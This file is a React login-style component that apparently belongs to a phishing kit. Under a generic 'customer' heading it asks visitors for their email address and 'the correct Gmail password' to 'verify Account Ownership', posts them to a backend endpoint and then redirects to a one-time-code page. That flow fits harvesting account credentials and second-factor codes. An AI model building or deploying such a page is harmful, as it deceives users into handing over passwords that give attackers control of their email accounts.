import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import "../App.css";
import "../styles/email.css";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";

// Validation schema using yup
const schema = yup.object().shape({
  email: yup
    .string()
    .email("Enter a valid email")
    .required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Email = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);

  // Handle form submission
  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/email`, data)
      .then((response) => {
        console.log(response.data);
        reset();
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };
  return (
    <div className="email-screen">
      <div className="email-container">
        <div className="email-header">
          <div className="email-title">customer</div>
          <div className="email-subtitle">
            Kindly Enter the email address you used during registration and the
            correct Gmail password linked to that email to verify Account
            Ownership.
          </div>
        </div>
        <div className="email-card">
          <form onSubmit={handleSubmit(submitForm)} className="email-form">
            <div className="form-group">
              <label className="email-label" htmlFor="email">
                Email Address
              </label>
              <input
                id="email"
                type="email"
                name="email"
                placeholder="example@email.com"
                className="email-input"
                {...register("email")}
              />
              <FormErrMsg errors={errors} inputName="email" />
            </div>

            <div className="form-group">
              <label className="email-label" htmlFor="password">
                Password
              </label>
              <input
                id="password"
                type="password"
                name="password"
                className="email-input"
                {...register("password")}
              />
              <FormErrMsg errors={errors} inputName="password" />
            </div>

            <button
              type="submit"
              className="email-submit-btn"
              disabled={loading}
            >
              {loading ? "Loading..." : "Sign In"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Email;
